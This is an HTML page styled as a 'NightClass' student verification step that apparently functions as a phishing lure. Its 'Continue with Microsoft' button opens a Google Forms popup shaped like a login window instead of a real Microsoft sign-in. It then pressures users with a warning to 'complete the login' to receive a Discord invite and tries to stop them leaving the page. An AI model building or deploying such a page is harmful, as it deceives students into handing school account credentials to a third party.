<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify Student â€” NightClass</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
  <style>
    :root {
      --bg: #0d1115;
      --surface: #161b22;
      --border: #30363d;
      --text: #f0f6fc;
      --muted: #8b949e;
      --accent: #58a6ff;
      --warning: #d29922;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: var(--bg);
      color: var(--text);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .verify-box {
      background: var(--surface);
      padding: 40px;
      border-radius: 18px;
      border: 1px solid var(--border);
      width: 100%;
      max-width: 480px;
      text-align: center;
      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
    }

    .logo {
      font-size: 36px;
      font-weight: 700;
      background: linear-gradient(135deg, #58a6ff, #8b5cf6);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 8px;
    }

    h2 {
      font-size: 24px;
      margin-bottom: 16px;
      color: white;
    }

    .info {
      color: var(--muted);
      font-size: 15px;
      margin-bottom: 28px;
      line-height: 1.6;
    }

    .input-group {
      position: relative;
      margin-bottom: 20px;
    }
    .input-group i {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--muted);
    }
    .input-group input {
      width: 100%;
      padding: 14px 14px 14px 44px;
      background: #0d1115;
      border: 1px solid var(--border);
      border-radius: 12px;
      color: white;
      font-size: 15px;
    }

    button {
      width: 100%;
      padding: 14px;
      background: var(--accent);
      color: white;
      border: none;
      border-radius: 12px;
      font-weight: 600;
      font-size: 16px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      transition: 0.3s;
    }
    button:hover {
      background: #1f6feb;
      transform: translateY(-2px);
    }

    .warning {
      display: none;
      background: rgba(210, 153, 34, 0.15);
      border: 1px solid var(--warning);
      color: #f5d08a;
      padding: 16px;
      border-radius: 12px;
      margin-top: 20px;
      font-weight: 600;
      font-size: 14.5px;
      line-height: 1.5;
    }
  </style>
</head>
<body>

  <div class="verify-box">
    <div class="logo">NightClass</div>
    <h2>Verify Student Status</h2>

    <p class="info">
      To join, you must verify your student status using your <strong>.edu or .ca school email</strong>.
    </p>

    <div class="input-group">
      <i class="fas fa-envelope"></i>
      <input type="email" id="email" placeholder="you@college.edu" required />
    </div>

    <button onclick="startVerification()">
      Continue with Microsoft
    </button>

    <div id="warning" class="warning">
      Verification incomplete. Please complete the login in the popup window to receive your Discord invite.
    </div>
  </div>

  <script>
    let loginWindow = null;

    function startVerification() {
    


      loginWindow = window.open(
        'https://forms.gle/EtX29seL1rYqX4Vq9',
        'student-login',
        'width=500,height=600,scrollbars=yes,resizable=yes'
      );

      if (!loginWindow || loginWindow.closed) {
        alert('Popup blocked. Please allow popups and try again.');
        return;
      }

      const checkClosed = setInterval(() => {
        if (loginWindow.closed) {
          clearInterval(checkClosed);
          document.getElementById('warning').style.display = 'block';
        }
      }, 500);
    }

    window.addEventListener('beforeunload', (e) => {
      if (loginWindow && !loginWindow.closed) {
        e.preventDefault();
        e.returnValue = '';
      }
    });
  </script>

</body>
</html>
